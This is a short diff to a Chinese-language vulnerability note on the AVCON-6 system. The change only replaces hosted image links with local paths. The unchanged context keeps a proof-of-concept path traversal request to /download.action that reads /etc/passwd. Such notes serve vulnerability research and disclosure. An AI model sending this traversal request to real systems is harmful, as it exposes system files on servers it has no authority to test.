@@ -20,7 +20,7 @@ app="AVCON-6"
 
 登录页面
 
-![img](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202101910735.png)
+![img](./images/202202101910735.png)
 
 验证POC
 
@@ -28,4 +28,4 @@ app="AVCON-6"
 /download.action?filename=../../../../../../etc/passwd
 ```
 
-![img](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202101910750.png)
+![img](./images/202202101910750.png)
